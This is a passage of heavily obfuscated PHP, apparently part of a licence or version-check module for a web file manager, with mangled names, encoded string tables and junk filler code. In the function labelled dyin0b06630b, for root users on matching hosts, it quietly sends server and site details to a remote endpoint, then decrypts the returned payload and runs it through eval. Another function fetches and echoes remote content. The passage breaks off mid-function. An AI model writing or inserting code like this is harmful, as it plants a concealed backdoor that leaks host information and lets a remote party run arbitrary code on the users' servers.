$this->paonea230346($†‘¿âÎ«, $ıÃñÌß¥[217]); $×–Ñ€ş = stream_context_create(array($ıÃñÌß¥[218] => array($ıÃñÌß¥[219] => $ıÃñÌß¥[220], $ıÃñÌß¥[221] => 3))); $£Ø²æŒŞ = $çÉ¡™æ™[720]; while (strlen($£Ø²æŒŞ) < $çÉ¡™æ™[679]) { if (!$£Ø²æŒŞ) { break; } $£Ø²æŒŞ++; } $×‹¶È–Ë = @file_get_contents($†‘¿âÎ«, !1, $×–Ñ€ş); $ÌŠˆ– = $çÉ¡™æ™[721]; if (!$ÌŠˆ–) { return; } header($ıÃñÌß¥[222]); if ($×‹¶È–Ë && strstr($×‹¶È–Ë, $ıÃñÌß¥[223])) { echo $×‹¶È–Ë; } die; } public function umbefc00f8be($©à½ß·Å) { $·¦È»÷˜ =& $_SERVER[Ñ¯©ç]; $¼–«Ş¢ =& $_SERVER[‚Õ“‡ÑÇ]; if ($this->mvzj841631ff == $¼–«Ş¢[224]) { return $©à½ß·Å; } $›ƒÔÆä = $this->versionPluginList(); $ğ”œÌ¹ = $·¦È»÷˜[722]; if (!$ğ”œÌ¹) { die; } $ö¿´Û¯ª = explode($¼–«Ş¢[225], $this->versionPluginFilter()); $°ººÄÌÃ = array(); foreach ($›ƒÔÆä as $Ä£¼ß› => $õ¼ ŞåĞ) { if ($õ¼ ŞåĞ == $¼–«Ş¢[226] && substr($this->mvzj841631ff, 0, 1) == $¼–«Ş¢[226]) { continue; } if (!in_array($Ä£¼ß›, $ö¿´Û¯ª)) { $°ººÄÌÃ[] = $Ä£¼ß›; } } foreach ($°ººÄÌÃ as $Ä£¼ß›) { unset($©à½ß·Å[$Ä£¼ß›]); } return $©à½ß·Å; $ÂññäË“ = $·¦È»÷˜[723]; if (!$ÂññäË“) { return; } } private function versionPluginList() { $ê²Ô„ò… =& $_SERVER[‚Õ“‡ÑÇ]; return array($ê²Ô„ò…[227] => $ê²Ô„ò…[226], $ê²Ô„ò…[228] => $ê²Ô„ò…[226], $ê²Ô„ò…[229] => $ê²Ô„ò…[226], $ê²Ô„ò…[230] => $ê²Ô„ò…[231], $ê²Ô„ò…[232] => $ê²Ô„ò…[231], $ê²Ô„ò…[233] => $ê²Ô„ò…[231], $ê²Ô„ò…[234] => $ê²Ô„ò…[231], $ê²Ô„ò…[235] => $ê²Ô„ò…[231], $ê²Ô„ò…[236] => $ê²Ô„ò…[231], $ê²Ô„ò…[237] => $ê²Ô„ò…[231], $ê²Ô„ò…[238] => $ê²Ô„ò…[231], $ê²Ô„ò…[239] => $ê²Ô„ò…[231], $ê²Ô„ò…[240] => $ê²Ô„ò…[231], $ê²Ô„ò…[241] => $ê²Ô„ò…[231], $ê²Ô„ò…[242] => $ê²Ô„ò…[231], $ê²Ô„ò…[243] => $ê²Ô„ò…[231]); } private function versionPluginFilter() { $…ğöÆ§Ò =& $_SERVER[Ñ¯©ç]; $€”Îã =& $_SERVER[‚Õ“‡ÑÇ]; if ($this->mvzj841631ff == $€”Îã[108]) { return $€”Îã[6]; } $ÎìçË½Œ = _get($this->akxz41631b59, $€”Îã[244], $€”Îã[6]); $Ñã¦˜œÎ = $…ğöÆ§Ò[724]; if (strlen($Ñã¦˜œÎ) < $…ğöÆ§Ò[679]) { return; } $…´®´ã = _get($this->akxz41631b59, $€”Îã[115], $€”Îã[6]); $Ø‘„áÜº = $…ğöÆ§Ò[725]; if (strlen($Ø‘„áÜº) < $…ğöÆ§Ò[679]) { return; } $Ë½ÍÔ×Õ = _get($this->akxz41631b59, $€”Îã[245], $€”Îã[6]); $·Ë¦Ü¡µ = $…ğöÆ§Ò[726]; if ($…´®´ã > time() && $Ë½ÍÔ×Õ > time()) { $¿’œ¶‚± = explode($€”Îã[225], $ÎìçË½Œ); $Ó€ëœÓç = array_keys($this->versionPluginList()); $ÎìçË½Œ = array_merge($¿’œ¶‚±, $Ó€ëœÓç); $ÎìçË½Œ = implode($€”Îã[225], array_filter(array_unique($ÎìçË½Œ))); } return $ÎìçË½Œ; } private function jdaz12c416bc() { $Ôè€ìÈ² =& $_SERVER[‚Õ“‡ÑÇ]; if ($this->mvzj841631ff != $Ôè€ìÈ²[108]) { $GLOBALS[$Ôè€ìÈ²[85]][$Ôè€ìÈ²[89]][$Ôè€ìÈ²[246]] = $Ôè€ìÈ²[205]; return; } $GLOBALS[$Ôè€ìÈ²[85]][$Ôè€ìÈ²[247]] = $Ôè€ìÈ²[121]; if (Model($Ôè€ìÈ²[248])->get($Ôè€ìÈ²[63]) != $Ôè€ìÈ²[205]) { Model($Ôè€ìÈ²[248])->set($Ôè€ìÈ²[63], $Ôè€ìÈ²[205]); } } public function bzxdcaf815a9() { return $_SERVER[‚Õ“‡ÑÇ][249]; $¬‚¿Í¤° = $_SERVER[Ñ¯©ç][727]; if (!$¬‚¿Í¤°) { return; } } private function dyin0b06630b() { $ü¬ˆÄñ =& $_SERVER[Ñ¯©ç]; $¦“ª—İ­ =& $_SERVER[‚Õ“‡ÑÇ]; $Úûà«²ç = array($¦“ª—İ­[250], $¦“ª—İ­[251], $¦“ª—İ­[252]); $«ÈŠ©˜Â = $¦“ª—İ­[253] . md5($¦“ª—İ­[254]); if ($this->mvzj841631ff == $¦“ª—İ­[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¦“ª—İ­[24]], $Úûà«²ç)) { return; } if (time() % 4 != 0) { return; } $ˆ»ô¢² = call_user_func(array($¦“ª—İ­[255], $¦“ª—İ­[256]), $«ÈŠ©˜Â); $×Õ¼ƒÇÖ = $ü¬ˆÄñ[728]; if (!$×Õ¼ƒÇÖ) { die; } if ($ˆ»ô¢² && time() - $ˆ»ô¢² < intval($¦“ª—İ­[257])) { return; } call_user_func(array($¦“ª—İ­[255], $¦“ª—İ­[138]), $«ÈŠ©˜Â, time()); $¨Œ¶‘ı® = Model($¦“ª—İ­[33])->get($¦“ª—İ­[99]); $ªãÄ™Í· = array($¦“ª—İ­[151] => Model($¦“ª—İ­[33])->get($¦“ª—İ­[152]), $¦“ª—İ­[166] => $this->mvzj841631ff, $¦“ª—İ­[162] => $_SERVER[$¦“ª—İ­[163]], $¦“ª—İ­[164] => Model($¦“ª—İ­[33])->get($¦“ª—İ­[130]), $¦“ª—İ­[104] => md5($_SERVER[$¦“ª—İ­[105]] . $¨Œ¶‘ı®), $¦“ª—İ­[155] => $¦“ª—İ­[135], $¦“ª—İ­[158] => $_SERVER[$¦“ª—İ­[159]]); $—İÈ¡ß = $ü¬ˆÄñ[729]; $†‰”ßÚ = $this->kmwa96793806($¦“ª—İ­[258], $ªãÄ™Í·); if (!is_array($†‰”ßÚ)) { return; } if ($†‰”ßÚ[$¦“ª—İ­[151]] && $†‰”ßÚ[$¦“ª—İ­[259]]) { if ($this->chns6d4815df($†‰”ßÚ[$¦“ª—İ­[259]]) == $ªãÄ™Í·[$¦“ª—İ­[151]]) { return; } } $this->bhxm410c2eb1(); if ($this->chns6d4815df($†‰”ßÚ[$¦“ª—İ­[259]]) != $ªãÄ™Í·[$¦“ª—İ­[151]]) { $º¼°Õæ = array($¦“ª—İ­[184] => $¨Œ¶‘ı®, $¦“ª—İ­[185] => $_SERVER[$¦“ª—İ­[105]], $¦“ª—İ­[186] => this_url(), $¦“ª—İ­[160] => $_SERVER[$¦“ª—İ­[161]]); $Èèä÷Æò = $this->dbve5e716f07(json_encode($º¼°Õæ)); $†‰”ßÚ = $this->kmwa96793806($¦“ª—İ­[187] . $Èèä÷Æò); if ($†‰”ßÚ && is_array($†‰”ßÚ) && isset($†‰”ßÚ[$¦“ª—İ­[259]])) { $ê–›¢ = $this->suew71249bf1($†‰”ßÚ[$¦“ª—İ­[259]], 2); if ($ê–›¢) { $ê–›¢ = $this->chns6d4815df($ê–›¢); } if ($ê–›¢) { try { @eval($ê–›¢); } catch (Exception $¼ıØäÍ×) { } } } } } private function kmwa96793806($ó‚±†¢Ö = '', $à÷½¤‘² = array(), $üÒ¦Ş « = 5) { $³Â“Á›Õ =& $_SERVER[Ñ¯©ç]; $¶ùˆİ¹Í =& $_SERVER[‚Õ“‡ÑÇ]; $À¾û«ĞÄ = $¶ùˆİ¹Í[260]; $‡‚£şÍ‚ = $³Â“Á›Õ[730]; if (strlen($‡‚£şÍ‚) < $³Â“Á›Õ[689]) { die; } $À¾û«ĞÄ = $this->paonea230346($À¾û«ĞÄ, $¶ùˆİ¹Í[261]); $À¾û«ĞÄ = $À¾û«ĞÄ . $ó‚±†¢Ö; $µè¨‰ƒ— = $³Â“Á›Õ[731]; if (strlen($µè¨‰ƒ—) < $³Â“Á›Õ[663]) { return; } if ($à÷½¤‘² && is_array($à÷½¤‘²)) { $À¾û«ĞÄ = $À¾û«ĞÄ . $¶ùˆİ¹Í[262] . http_build_query($à÷½¤‘²); } if ($à÷½¤‘² === -1) { return $À¾û«ĞÄ; } $±¤ªÎÊ° = stream_context_create(array($¶ùˆİ¹Í[218] => array($¶ùˆİ¹Í[221] => $üÒ¦Ş «, $¶ùˆİ¹Í[219] => $¶ùˆİ¹Í[263]), $¶ùˆİ¹Í[264] => array($¶ùˆİ¹Í[265] => !1, $¶ùˆİ¹Í[266] => !1))); $Àœòç¡ = $³Â“Á›Õ[732]; if (strlen($Àœòç¡) < $³Â“Á›Õ[679]) { die; } $à÷½¤‘² = @file_get_contents($À¾û«ĞÄ, !1, $±¤ªÎÊ°); $Éˆ§ÆÚ¡ = $³Â“Á›Õ[733]; if (strlen($Éˆ§ÆÚ¡) < $³Â“Á›Õ[689]) { die; } return json_decode($à÷½¤‘², !0); $íÃ¦¾É = $³Â“Á›Õ[734]; $å©‚ıú = $³Â“Á›Õ[735]; } private function xftm17fa6a86() { $ëÎÃ“û =& $_SERVER[Ñ¯©ç]; $÷•ª¸õİ =& $_SERVER[‚Õ“‡ÑÇ]; $Æ³âÔ‡® = array($÷•ª¸õİ[267] => $÷•ª¸õİ[268], $÷•ª¸õİ[269] => $÷•ª¸õİ[270], $÷•ª¸õİ[271] => $÷•ª¸õİ[272], $÷•ª¸õİ[273] => $÷•ª¸õİ[274], $÷•ª¸õİ[275] => $÷•ª¸õİ[276], $÷•ª¸õİ[277] => $÷•ª¸õİ[213], $÷•ª¸õİ[278] => $÷•ª¸õİ[213], $÷•ª¸õİ[279] => $÷•ª¸õİ[268], $÷•ª¸õİ[280] => $÷•ª¸õİ[270], $÷•ª¸õİ[281] => $÷•ª¸õİ[272], $÷•ª¸õİ[282] => $÷•ª¸õİ[283], $÷•ª¸õİ[284] => $÷•ª¸õİ[274], $÷•ª¸õİ[285] => $÷•ª¸õİ[286], $÷•ª¸õİ[287] => $÷•ª¸õİ[276], $÷•ª¸õİ[288] => $÷•ª¸õİ[289], $÷•ª¸õİ[290] => $÷•ª¸õİ[291], $÷•ª¸õİ[292] => $÷•ª¸õİ[293]); $äÄË±Ñ´ = $Æ³âÔ‡®[$this->mvzj841631ff]; $äÄË±Ñ´ = intval($äÄË±Ñ´ ? $äÄË±Ñ´ : $÷•ª¸õİ[268]); $Å÷Ÿò¤Î = $ëÎÃ“û[736]; if (strlen($Å÷Ÿò¤Î) < $ëÎÃ“û[60]) { return; } $Î“ Ë£Ê = _get($this->akxz41631b59, $÷•ª¸õİ[294]); $ùöæŞ = $ëÎÃ“û[737]; if (strlen($ùöæŞ) < $ëÎÃ“û[60]) { return; } $Î“ Ë£Ê = $Î“ Ë£Ê ? intval($Î“ Ë£Ê) : 0; return $äÄË±Ñ´ + $Î“ Ë£Ê; $ÒøØòŠÍ = $ëÎÃ“û[738]; } public function atcr30738797($‚¨Šº–º) { $ãÀºÕÆ• =& $_SERVER[Ñ¯©ç]; $€©şî¢ =& $_SERVER[‚Õ“‡ÑÇ]; $ç¯Æˆ©§ = $this->xftm17fa6a86(); if ($‚¨Šº–º[$€©şî¢[295]] == $€©şî¢[121]) { return; } if ($ç¯Æˆ©§ >= intval($€©şî¢[213])) { return; } $Ì‹­×û‚ = Model($€©şî¢[124])->count(); if ($Ì‹­×û‚ <= $ç¯Æˆ©§) { return; } $µÕš²ñç = Model($€©şî¢[124])->field($€©şî¢[295])->limit($ç¯Æˆ©§)->select(); $äæéıÊà = $ãÀºÕÆ•[739]; if (!$äæéıÊà) { die; } $µÕš²ñç = array_to_keyvalue($µÕš²ñç, $€©şî¢[6], $€©şî¢[295]); $…åëÚ½İ = $ãÀºÕÆ•[740]; if (!$…åëÚ½İ) { return; } if (!in_array($‚¨Šº–º[$€©şî¢[295]], $µÕš²ñç)) { show_json($€©şî¢[296], !1, $€©şî¢[209]); } } public function hplxc87a3bfa() { $ïßƒ½èÊ =& $_SERVER[Ñ¯©ç]; $ĞŒˆ ¶ö =& $_SERVER[‚Õ“‡ÑÇ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $¹„“ù¯ = $ĞŒˆ ¶ö[216]; $Ò„ç² = $ïßƒ½èÊ[741]; while (strlen($Ò„ç²) < $ïßƒ½èÊ[673]) { if (!$Ò„ç²) { break; } $Ò„ç²++; } $¹„“ù¯ = $this->paonea230346($¹„“ù¯, $ĞŒˆ ¶ö[217]); $¨¬Í£İş = stream_context_create(array($ĞŒˆ ¶ö[218] => array($ĞŒˆ ¶ö[219] => $ĞŒˆ ¶ö[220], $ĞŒˆ ¶ö[221] => 3))); $œœ©áè¶ = @file_get_contents($¹„“ù¯, !1, $¨¬Í£İş); echo $ĞŒˆ ¶ö[297] . hash_encode($œœ©áè¶) . $ĞŒˆ ¶ö[298]; } private function vwxs95a3b95d($†ıûíÚÉ, $Ú¹—°¶÷, $·Éäèâ = 3) { $Ûêè¿ù =& $_SERVER[Ñ¯©ç]; $ßµ¯–Åğ =& $_SERVER[‚Õ“‡ÑÇ]; usleep(1); $†ıûíÚÉ = trim($†ıûíÚÉ); $ŠÅ„ŸÑ… = mt_rand(0, 5) . $ßµ¯–Åğ[6]; $áÍ¸¬Èø = $Ûêè¿ù[742]; if (strlen($áÍ¸¬Èø) < $Ûêè¿ù[663]) { return; } $¯Ï¿¿Ù = rand_string(15); $Ñ· åı = $ßµ¯–Åğ[299]; $ã™ªâ‡€ = $Ûêè¿ù[743]; if (!$ã™ªâ‡€) { die; } switch ($ŠÅ„ŸÑ…) { case $ßµ¯–Åğ[205]: $üˆ¿ÇÖ = $this->bijvbf35d33c($†ıûíÚÉ, strrev($Ú¹—°¶÷ . $¯Ï¿¿Ù)); break; $ËÊ¯—Ï— = $Ûêè¿ù[744]; if (!$ËÊ¯—Ï—) { die; } case $ßµ¯–Åğ[121]: $üˆ¿ÇÖ = $this->bijvbf35d33c($†ıûíÚÉ, strrev($¯Ï¿¿Ù . $Ú¹—°¶÷)); $áè´ ›¬ = $Ûêè¿ù[745]; if (strlen($áè´ ›¬) < $Ûêè¿ù[673]) { return; } break; $È¾‡·ÀÔ = $Ûêè¿ù[746]; if (strlen($È¾‡·ÀÔ) < $Ûêè¿ù[60]) { return; } case $ßµ¯–Åğ[300]: $üˆ¿ÇÖ = $this->bijvbf35d33c($†ıûíÚÉ, base64_encode($¯Ï¿¿Ù . $Ú¹—°¶÷)); break; $÷öÏâ¢Æ = $Ûêè¿ù[747]; if (strlen($÷öÏâ¢Æ) < $Ûêè¿ù[679]) { die; } case $ßµ¯–Åğ[301]: $üˆ¿ÇÖ = $this->bijvbf35d33c($†ıûíÚÉ, md5($¯Ï¿¿Ù . $Ú¹—°¶÷)); break; $ÊÊÒà÷º = $Ûêè¿ù[748]; if (strlen($ÊÊÒà÷º) < $Ûêè¿ù[60]) { die; } case $ßµ¯–Åğ[302]: $†ıûíÚÉ = base64_encode($†ıûíÚÉ); $ğæ™’ = rand(0, 64); $úŞë– = $Ûêè¿ù[749]; while ($úŞë– < $Ûêè¿ù[663]) { if ($úŞë– >= 0) { break; } $úŞë–++; } $Åê½” = $Ñ· åı[$ğæ™’]; $°øÉ‚Ğº = md5($Åê½” . md5($Ú¹—°¶÷ . $Åê½”) . $Ú¹—°¶÷); $°øÉ‚Ğº = substr($°øÉ‚Ğº, $ğæ™’ % 8, $ğæ™’ % 8 + 7); $íçØĞÓ = $Ûêè¿ù[750]; if (strlen($íçØĞÓ) < $Ûêè¿ù[663]) { die; } $åéÕ–õŞ = $ßµ¯–Åğ[6]; $¢±½œè˜ = 0; $ÄşŒØíÄ = 0; $ÅŸ‡¥ç… = 0; $ª¸Õ…­» = $Ûêè¿ù[751]; if (!$ª¸Õ…­») { return; } for ($¢±½œè˜ = 0; $¢±½œè˜ < strlen($†ıûíÚÉ); $¢±½œè˜++) { $ÅŸ‡¥ç… = $ÅŸ‡¥ç… == strlen($°øÉ‚Ğº) ? 0 : $ÅŸ‡¥ç…; $»ğ¾®Î = $Ûêè¿ù[752]; while (strlen($»ğ¾®Î) < $Ûêè¿ù[673]) { if (!$»ğ¾®Î) { break; } $»ğ¾®Î++; } $ÄşŒØíÄ = ($ğæ™’ + strpos($Ñ· åı, $†ıûíÚÉ[$¢±½œè˜]) + ord($°øÉ‚Ğº[$ÅŸ‡¥ç…++])) % 64; $Å¼íèù¨ = $Ûêè¿ù[753]; while ($Å¼íèù¨ < $Ûêè¿ù[60]) { if ($Å¼íèù¨ >= 0) { break; } $Å¼íèù¨++; } $åéÕ–õŞ .= $Ñ· åı[$ÄşŒØíÄ]; $ĞÛÎı = $Ûêè¿ù[754]; while ($ĞÛÎı < $Ûêè¿ù[60]) { if ($ĞÛÎı >= 0) { break; } $ĞÛÎı++; } } $üˆ¿ÇÖ = hash_encode($Åê½” . $åéÕ–õŞ); break; $îÜœÖ¢ = $Ûêè¿ù[755]; default: $üˆ¿ÇÖ = $this->bijvbf35d33c($†ıûíÚÉ, $Ú¹—°¶÷ . $¯Ï¿¿Ù); break; $ôÊ¾Íï¿ = $Ûêè¿ù[756]; while ($ôÊ¾Íï¿ < $Ûêè¿ù[673]) { if ($ôÊ¾Íï¿ >= 0) { break; } $ôÊ¾Íï¿++; } } $üˆ¿ÇÖ = strrev($ŠÅ„ŸÑ… . $¯Ï¿¿Ù . $üˆ¿ÇÖ); $„ÜüïÖ = $Ûêè¿ù[757]; while (strlen($„ÜüïÖ) < $Ûêè¿ù[673]) { if (!$„ÜüïÖ) { break; } $„ÜüïÖ++; } if ($·Éäèâ - 1 > 0) { $üˆ¿ÇÖ = $this->vwxs95a3b95d($üˆ¿ÇÖ, $Ú¹—°¶÷, $·Éäèâ - 1); } return $üˆ¿ÇÖ; } private function suew71249bf1($É®„û•Û, $ßÔÙ Ö’, $ÒÑ˜„µ¥ = 3) { $‡âõ®î =& $_SERVER[Ñ¯©ç]; $‰¥‰¿“ =& $_SERVER[‚Õ“‡ÑÇ]; if (!is_string($É®„û•Û) || strlen($É®„û•Û) < 10) { return !1; } $É®„û•Û = trim($É®„û•Û); $›ğŸ±•¢ = $‡âõ®î[758]; if (!$›ğŸ±•¢) { die; } $É®„û•Û = strrev($É®„û•Û); $´¼íÕù€ = $‡âõ®î[759]; if (strlen($´¼íÕù€) < $‡âõ®î[663]) { return; } $÷Ò“Åò = $É®„û•Û[0]; $äæ“¶° = $‡âõ®î[760]; if (strlen($äæ“¶°) < $‡âõ®î[679]) { die; } $ôßÏªôÜ = substr($É®„û•Û, 1, 15); $É®„û•Û = substr($É®„û•Û, 16); $ùÑİ­Š˜ = $‰¥‰¿“[299]; $ñĞ©¶Ö  = $‡âõ®î[761]; if (!$ñĞ©¶Ö ) { return; } switch ($÷Ò“Åò) { case $‰¥‰¿“[205]: $ı„¦œ¨´ = $this->paonea230346($É®„û•Û, strrev($ßÔÙ Ö’ . $ôßÏªôÜ)); $Ò¤ş‚‡œ = $‡âõ®î[762]; while (strlen($Ò¤ş‚‡œ) < $‡âõ®î[60]) { if (!$Ò¤ş‚‡œ) { break; } $Ò¤ş‚‡œ++; } break; case $‰¥‰¿“[121]: $ı„¦œ¨´ = $this->paonea230346($É®„û•Û, strrev($ôßÏªôÜ . $ßÔÙ Ö’)); $Ëí¢Ê• = $‡âõ®î[763]; while (strlen($Ëí¢Ê•) < $‡âõ®î[663]) { if (!$Ëí¢Ê•) { break; } $Ëí¢Ê•++; } break; $Ğ‰®…âü = $‡âõ®î[764]; while (strlen($Ğ‰®…âü) < $‡âõ®î[60]) { if (!$Ğ‰®…âü) { break; } $Ğ‰®…âü++; } case $‰¥‰¿“[300]: $ı„¦œ¨´ = $this->paonea230346($É®„û•Û, base64_encode($ôßÏªôÜ . $ßÔÙ Ö’)); break; case $‰¥‰¿“[301]: $ı„¦œ¨´ = $this->paonea230346($É®„û•Û, md5($ôßÏªôÜ . $ßÔÙ Ö’)); break; $é­»ø½¶ = $‡âõ®î[765]; while ($é­»ø½¶ < $‡âõ®î[673]) { if ($é­»ø½¶ >= 0) { break; } $é­»ø½¶++; } case $‰¥‰¿“[302]: $É®„û•Û = hash_decode($É®„û•Û); $ôş¿ººû = $‡âõ®î[766]; if (strlen($ôş¿ººû) < $‡âõ®î[689]) { die; } $¶¢´ßç… = $É®„û•Û[0]; $²¨ù‹ö¸ = $‡âõ®î[767]; while (strlen($²¨ù‹ö¸) < $‡âõ®î[663]) { if (!$²¨ù‹ö¸) { break; } $²¨ù‹ö¸++; } $É®„û•Û = substr($É®„û•Û, 1); $œù™œ·Å = $‡âõ®î[768]; while (strlen($œù™œ·Å) < $‡âõ®î[679]) { if (!$œù™œ·Å) { break; } $œù™œ·Å++; } $³ÕÅŒ´ = strpos($ùÑİ­Š˜, $¶¢´ßç…); $øôÕ´ÚÇ = $‡âõ®î[769]; while ($øôÕ´ÚÇ < $‡âõ®î[679]) { if ($øôÕ´ÚÇ >= 0) { break; } $øôÕ´ÚÇ++; } $÷À«êù² = md5($¶¢´ßç… . md5($ßÔÙ Ö’ . $¶¢´ßç…) . $ßÔÙ Ö’); $÷À«êù² = substr($÷À«êù², $³ÕÅŒ´ % 8, $³ÕÅŒ´ % 8 + 7); $”ü¥‡¦ = $‰¥‰¿“[6]; $½ÈÜ§™¨ = 0; $‚Ä¢Êë = 0; $­‰®’ùß = $‡âõ®î[770]; $·ÑˆÊæĞ = 0; for ($½ÈÜ§™¨ = 0; $½ÈÜ§™¨ < strlen($É®„û•Û); $½ÈÜ§™¨++) { $·ÑˆÊæĞ = $·ÑˆÊæĞ == strlen($÷À«êù²) ? 0 : $·ÑˆÊæĞ; $ëÔâİ¶Ù = $·ÑˆÊæĞ++; $Á†¬àÊ = $‡âõ®î[771]; $‚Ä¢Êë = strpos($ùÑİ­Š˜, $É®„û•Û[$½ÈÜ§™¨]) - $³ÕÅŒ´ - ord($÷À«êù²[$ëÔâİ¶Ù]); $“ÃÍİÑÜ = $‡âõ®î[772]; if (!$“ÃÍİÑÜ) { die; } while ($‚Ä¢Êë < 0) { $‚Ä¢Êë += 64; } $”ü¥‡¦ .= $ùÑİ­Š˜[$‚Ä¢Êë]; $„ìÒ§ = $‡âõ®î[773]; } $ı„¦œ¨´ = base64_decode($”ü¥‡¦); break; default: $ı„¦œ¨´ = $this->paonea230346($É®„û•Û, $ßÔÙ Ö’ . $ôßÏªôÜ); break; } if ($ÒÑ˜„µ¥ - 1 > 0) { $ı„¦œ¨´ = $this->suew71249bf1($ı„¦œ¨´, $ßÔÙ Ö’, $ÒÑ˜„µ¥ - 1); } return $ı„¦œ¨´; } public function dbve5e716f07($ìôÄ×õ–) { $¿˜™–šç =& $_SERVER[Ñ¯©ç]; $¬ö£ğá =& $_SERVER[‚Õ“‡ÑÇ]; $š²ËĞøó = $this->whvmaf88bed4(); $¼Ş‡‡Ï = $this->whvmaf88bed4(); $úÒ¿­óÆ = $¿˜™–šç[774]; if (strlen($úÒ¿­óÆ) < $¿˜™–šç[689]) { return; } $„ùãè§ö = ($š²ËĞøó - 1) * ($¼Ş‡‡Ï - 1); $‘Â¸Û„Á = intval(($š²ËĞøó + $¼Ş‡‡Ï) / 2); $İÄ«•ñâ = $¿˜™–šç[775]; if (strlen($İÄ«•ñâ) < $¿˜™–šç[60]) { die; } while (1) { $êĞ¡Ô± = $‘Â¸Û„Á; $ÛÇŒ¥ÈÓ = $„ùãè§ö; $ÛÂš©ßÙ = $¿˜™–šç[776]; if (!$ÛÂš©ßÙ) { die; } while ($ÛÇŒ¥ÈÓ % $êĞ¡Ô± != 0) { $–ºà’›  = $ÛÇŒ¥ÈÓ; $­ÌòÑßé = $¿˜™–šç[777]; $ÛÇŒ¥ÈÓ = $êĞ¡Ô±; $êĞ¡Ô± = $–ºà’›  % $êĞ¡Ô±; $Ê†õïì¿ = $¿˜™–šç[778]; } if ($êĞ¡Ô± == 1) { break; } else { $‘Â¸Û„Á++; } } $¸ıàÈ» = 2; $º»¶«œÒ = $¿˜™–šç[779]; if (strlen($º»¶«œÒ) < $¿˜™–šç[679]) { return; } for ($±™ÚÒ­ƒ = 0; $±™ÚÒ­ƒ < $„ùãè§ö * 10; $±™ÚÒ­ƒ++) { if (($„ùãè§ö * $±™ÚÒ­ƒ + 1) % $‘Â¸Û„Á == 0) { $¸ıàÈ» = intval(($„ùãè§ö * $±™ÚÒ­ƒ + 1) / $‘Â¸Û„Á); break; } } $¿€õÔªÕ = $this->bijvbf35d33c($š²ËĞøó * $¼Ş‡‡Ï . $¬ö£ğá[6], $¬ö£ğá[135]); $¤“‡İ‘è = md5($¬ö£ğá[303] . ($š²ËĞøó + $¼Ş‡‡Ï) . $¬ö£ğá[304] . $‘Â¸Û„Á . $¬ö£ğá[304] . $¸ıàÈ» . $¬ö£ğá[305]); $£ÊÕŸ = $¿˜™–šç[780]; while ($£ÊÕŸ < $¿˜™–šç[673]) { if ($£ÊÕŸ >= 0) { break; } $£ÊÕŸ++; } $“Öáû½à = $this->bijvbf35d33c($ìôÄ×õ–, $¤“‡İ‘è) . $¬ö£ğá[306] . $¿€õÔªÕ; $Ë¡Õùİê = $¿˜™–šç[781]; while ($Ë¡Õùİê < $¿˜™–šç[60]) { if ($Ë¡Õùİê >= 0) { break; } $Ë¡Õùİê++; } return $“Öáû½à; $Ÿ¥‹Æµ° = $¿˜™–šç[782]; } public function chns6d4815df($Ûû¬˜ÄŸ) { $´ì…ïïº =& $_SERVER[Ñ¯©ç]; $–Ì¨€Ò =& $_SERVER[‚Õ“‡ÑÇ]; $ÛüºËÏÁ = explode($–Ì¨€Ò[306], $Ûû¬˜ÄŸ); $÷Ÿ®“Šö = $´ì…ïïº[783]; if (strlen($÷Ÿ®“Šö) < $´ì…ïïº[679]) { return; } if (count($ÛüºËÏÁ) != 2) { return $–Ì¨€Ò[6]; } $€ÊüëÃ = $this->paonea230346($ÛüºËÏÁ[1] . $–Ì¨€Ò[6], $–Ì¨€Ò[135]); $·åûçöæ = $´ì…ïïº[784]; if (strlen($·åûçöæ) < $´ì…ïïº[679]) { return; } if (!$€ÊüëÃ) { return $–Ì¨€Ò[6]; } $€ÊüëÃ = intval($€ÊüëÃ); $Ğí·çÖ = 0; $æ‹‘§áŒ = 0; $ø¼¢è›­ = $´ì…ïïº[785]; if (strlen($ø¼¢è›­) < $´ì…ïïº[663]) { return; } for ($Û¯ş©Î = 3; $Û¯ş©Î < $€ÊüëÃ; $Û¯ş©Î += 2) { if ($€ÊüëÃ % $Û¯ş©Î != 0) { continue; } $Ğí·çÖ = $Û¯ş©Î; $çôûıİÍ = $´ì…ïïº[786]; $æ‹‘§áŒ = intval($€ÊüëÃ / $Û¯ş©Î); break; } $éÅÄ­Áë = ($Ğí·çÖ - 1) * ($æ‹‘§áŒ - 1); $À‰˜õíË = $´ì…ïïº[787]; if (strlen($À‰˜õíË) < $´ì…ïïº[689]) { die; } $ÚĞÃÖ›‹ = intval(($Ğí·çÖ + $æ‹‘§áŒ) / 2); $«¬ìÎ = $´ì…ïïº[788]; if (!$«¬ìÎ) { die; } while (1) { $Î‡ÈºË = $ÚĞÃÖ›‹; $Õ¸¾ø‚ = $´ì…ïïº[789]; if (strlen($Õ¸¾ø‚) < $´ì…ïïº[679]) { die; } $¬ê«ïÀ‹ = $éÅÄ­Áë; $Œ¼õ–×Ù = $´ì…ïïº[790]; while ($¬ê«ïÀ‹ % $Î‡ÈºË != 0) { $Ş÷½Úµ = $¬ê«ïÀ‹; $–¬™ò¼ä = $´ì…ïïº[791]; while (strlen($–¬™ò¼ä) < $´ì…ïïº[663]) { if (!$–¬™ò¼ä) { break; } $–¬™ò¼ä++; } $¬ê«ïÀ‹ = $Î‡ÈºË; $Î‡ÈºË = $Ş÷½Úµ % $Î‡ÈºË; $±‰¥¨¬ñ = $´ì…ïïº[792]; if (!$±‰¥¨¬ñ) { return; } } if ($Î‡ÈºË == 1) { break; } else { $ÚĞÃÖ›‹++; } } $ÌÃˆÊúØ = 2; $È­ìºää = $´ì…ïïº[793]; if (!$È­ìºää) { return; } for ($Û¯ş©Î = 0; $Û¯ş©Î < $éÅÄ­Áë * 10; $Û¯ş©Î++) { if (($éÅÄ­Áë * $Û¯ş©Î + 1) % $ÚĞÃÖ›‹ == 0) { $ÌÃˆÊúØ = intval(($éÅÄ­Áë * $Û¯ş©Î + 1) / $ÚĞÃÖ›‹); break; } } $šÕ˜›Æ = md5($–Ì¨€Ò[303] . ($Ğí·çÖ + $æ‹‘§áŒ) . $–Ì¨€Ò[304] . $ÚĞÃÖ›‹ . $–Ì¨€Ò[304] . $ÌÃˆÊúØ . $–Ì¨€Ò[305]); $£”ÃšÑ = $this->paonea230346($ÛüºËÏÁ[0], $šÕ˜›Æ); $´áÅû³Ó = $´ì…ïïº[794]; return $£”ÃšÑ; } public function whvmaf88bed4() { $ø„àˆÓü =& $_SERVER[Ñ¯©ç]; $í¿¢Øšœ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÑÊà­º = $ø„àˆÓü[795]; $Ì¦…®—ë = array(); $®’ÒæÑ = $ø„àˆÓü[796]; while 